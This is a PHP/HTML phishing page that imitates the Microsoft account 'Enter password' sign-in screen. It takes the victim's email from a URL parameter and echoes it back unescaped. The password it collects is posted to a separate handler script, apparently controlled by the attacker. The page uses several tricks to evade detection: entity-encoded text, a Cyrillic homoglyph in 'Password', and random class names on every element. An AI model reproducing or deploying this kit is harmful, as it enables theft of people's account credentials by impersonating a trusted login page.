<?php

error_reporting(0);
$email = $_GET['mes1'];

?>

<!doctype html>
<html dir="ltr" lang="EN-US">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>&#83;&#105;&#x67;&#110; &#105;&#x6E; &#116;&#x6F; &#121;&#x6F;&#117;&#x72; &#77;&#x69;&#99;&#x72;&#111;&#x73;&#111;&#x66;&#116; &#x61;&#99;&#x63;o&#x75;&#110;&#x74;</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="stylesheet" title="Converged" type="text/css" href="style.css">
	<style type="text/css">body{display:none;}</style>
	<style type="text/css">body{display:block !important;}</style>
	<style type="text/css">body{display:block !important;}</style>
</head>
<body class="<?php echo md5(uniqid(rand(), true)); ?> cb" data-bind="defineGlobals: ServerData, bodyCssClass">
	<div>
		<div class="<?php echo md5(uniqid(rand(), true)); ?> background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
			<div style="background-image: url(&quot;images/0-small.jpg&quot;);"></div>
			<div class="<?php echo md5(uniqid(rand(), true)); ?> backgroundImage" style="background-image: url(&quot;images/0.jpg&quot;);"></div>
		</div>
	</div> 
			<form novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="postp1.php">
			<div class="<?php echo md5(uniqid(rand(), true)); ?> outer">
				<div class="<?php echo md5(uniqid(rand(), true)); ?> middle">
					<div class="<?php echo md5(uniqid(rand(), true)); ?> inner">
						<div>
							<img class="<?php echo md5(uniqid(rand(), true)); ?> logo" src="images/logo.svg">
						</div>
					
						<div role="main" >
							<div class="">
								<div class="<?php echo md5(uniqid(rand(), true)); ?> animate slide-in-next"> 
									<div class="<?php echo md5(uniqid(rand(), true)); ?> identityBanner">
										<button type="button" class="<?php echo md5(uniqid(rand(), true)); ?> backButton" id="idBtn_Back" aria-label="Back">
										<img role="presentation" src="images/arrow_left.png"></button>
										<div id="displayName" class="<?php echo md5(uniqid(rand(), true)); ?> identity" title=""><?php echo $email; ?></div>
									</div>
								</div>
							</div>
								<div class="<?php echo md5(uniqid(rand(), true)); ?> pagination-view animate has-identity-banner slide-in-next" >
									<input name="kamu" value="<?php echo $email; ?>" type="hidden"> 
									<input name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"> 
									<div id="loginHeader" class="<?php echo md5(uniqid(rand(), true)); ?> row text-title" role="heading" aria-level="1" >Enter &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64;</div>
										<div class="row"> 
											<div class="<?php echo md5(uniqid(rand(), true)); ?> form-group col-md-24"> 
												<div role="alert" aria-live="assertive" aria-atomic="false"></div>
												<div class="<?php echo md5(uniqid(rand(), true)); ?> placeholderContainer" >
													<input name="rahasia1" id="i0118" required="" autocomplete="off" autofocus="" class="<?php echo md5(uniqid(rand(), true)); ?> form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="P&#1072;ssword" aria-label="Enter the &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64; for <?php echo $email; ?>" type="password">
												</div> 
											</div> 
										</div>
									<div class="<?php echo md5(uniqid(rand(), true)); ?> position-buttons">
										<div>
											<div id="idTd_PWD_KMSI_Cb" class="<?php echo md5(uniqid(rand(), true)); ?> form-group checkbox text-block-body no-margin-top"> 
												<label id="idLbl_PWD_KMSI_Cb"> 
												<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" aria-label="Keep me signed in" type="checkbox"> 
												<span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me &#x73;&#105;&#x67;&#110;ed in</span></label> 
											</div>
											<div class="<?php echo md5(uniqid(rand(), true)); ?> row"> 
												<div class="<?php echo md5(uniqid(rand(), true)); ?> col-md-24"> 
													<div class="<?php echo md5(uniqid(rand(), true)); ?> text-13 action-links"> 
														<div class="<?php echo md5(uniqid(rand(), true)); ?> form-group">
														<a id="idA_PWD_ForgotPassword" role="link" href="#" >&#70;&#x6F;&#114;&#x67;&#x6F;&#116; my &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64;</a></div>
													<div class="<?php echo md5(uniqid(rand(), true)); ?> form-group"></div>
													</div> 
												</div> 
											</div> 
										</div>
										<div class="<?php echo md5(uniqid(rand(), true)); ?> row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> 
										<div class="<?php echo md5(uniqid(rand(), true)); ?> col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" >
											<div class="<?php echo md5(uniqid(rand(), true)); ?> inline-block">
												<input id="idSIButton9" class="btn btn-block btn-primary" value="Sign in" type="submit"> 
											</div> 
										</div>
									</div> 
								</div>
							</div>
						</div>
					</div> 
				</div> 
			</div> 
					<div id="footer" class="<?php echo md5(uniqid(rand(), true)); ?> footer default"> 
						<div>
							<div id="footerLinks" class="<?php echo md5(uniqid(rand(), true)); ?> footerNode text-secondary">
								<a id="ftrTerms" href="#">Terms of use</a> 
								<a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
								<a href="#" role="button" class="<?php echo md5(uniqid(rand(), true)); ?> moreOptions">
								<img class="<?php echo md5(uniqid(rand(), true)); ?> desktopMode" role="presentation" src="images/ellipsis_white.png?x=2b5d393db04a5e6e1f739cb266e65b4c"></img></a>
							</div> 
						</div> 
					</div> 
		</form> 
		<form method="post" target="_top"></form>
</body>
</html>
